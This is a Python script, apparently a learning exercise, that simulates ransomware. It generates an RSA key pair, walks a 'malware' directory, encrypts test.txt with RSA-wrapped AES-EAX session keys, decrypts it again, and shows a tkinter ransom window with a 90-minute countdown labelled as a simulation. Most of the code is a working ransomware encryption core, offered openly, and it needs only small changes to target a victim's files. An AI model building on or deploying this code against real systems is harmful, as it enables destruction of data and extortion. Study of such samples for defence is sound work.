import base64
import os
from os import walk
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk


# Generate private and public keys
key = RSA.generate(2048)
privateKey = key.export_key()
publicKey = key.publickey().export_key()
## print(publicKey)
## print(privateKey)


# Encrypt test in base64
def test():
    with open('public.pem', 'rb') as f:
        public = f.read() 
        print(base64.b64encode(public ))
## test()


# Save keys in external files
with open('private.pem','w') as privateKeyf:
	privateKeyf.write(privateKey.decode())
	privateKeyf.close()

with open('public.pem','w') as publicKeyf:
	publicKeyf.write(publicKey.decode())
	publicKeyf.close()

print('Private key saved to private.pem')
print('Public key saved to public.pem')


# Lister les fichiers présents dans le repertoire malware
def filelist():
    listeFichiers = []
    for (repertoire, sousRepertoires, fichiers) in walk("/home/parallels/Documents/malware/"):
        listeFichiers.extend(fichiers)
        print(listeFichiers)
filelist()



def encrypt(dataFile, publicKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    
    # Read the file to encrypt
    path, extension = os.path.splitext(dataFile)
    extension = extension.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # Convert data to bytes
    data = bytes(data)
    
    # Create public key object
    key = RSA.import_key(publicKey)

    # Generates a symmetric encryption key
    sessionKey = os.urandom(16)
    cipher = PKCS1_OAEP.new(key)

    # Encryption of the symmetric encryption key with the public key
    encryptedSessionKey = cipher.encrypt(sessionKey)
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # This part allows you to save your file under the name filename_encrypt.ext
    fileName = dataFile.split(extension)[0]
    fileExtension = '.tag'
    ## [fileName, fileExtension] = dataFile.split('.')
    encryptedFile = fileName + '_encrypted' + fileExtension
    with open(encryptedFile, 'wb') as f:
        [f.write(x)
         for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    print('Encrypted file saved to ' + encryptedFile)


# Test the encrypt function
fileName = 'test.txt'
encrypt(fileName, publicKey)


def decrypt(dataFile, privateKeyFile):
    '''
    use EAX mode to allow detection of unauthorized modifications 
    '''
    path, extension = os.path.splitext(dataFile)
    extension = extension.lower()
    # Read the private key
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # Create private key object
        key = RSA.import_key(privateKey)
    with open(dataFile, 'rb') as f:
        # Read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [f.read(x) for x in (key.size_in_bytes(), 16, 16, -1)
                                                       ]
    cipher = PKCS1_OAEP.new(key)
    # Allows you to decrypt the encryption key
    sessionKey = cipher.decrypt(encryptedSessionKey)

    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)

    # To decrypt the data
    data = cipher.decrypt_and_verify(ciphertext, tag)

    fileName = dataFile.split(extension)[0]
    fileExtension = '.txt'
    decryptedFile = fileName + '_decrypted' + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)
    print('Decrypted file saved to ' + decryptedFile)

privateKeyFile = 'private.pem'
fileName = 'test_encrypted.tag'
decrypt(fileName, privateKeyFile)


# Countdown function
def countdown(count):
    # change text in label
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    label['text'] = '{}:{}:{}'.format(hour, minute, second)
    if second > 0 or minute > 0 or hour > 0:

        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))


root = tk.Tk()
root.title('My nt R4nsomw4r3')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data is under rest, please don \'t pay me,\nthis just simulation !!\n\n', font=(
    'calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='white', bg='blue')
label.pack()
# Call countdown first time
countdown('01:30:00')
# root.after(0, countdown, 5)
root.mainloop()


print('Done')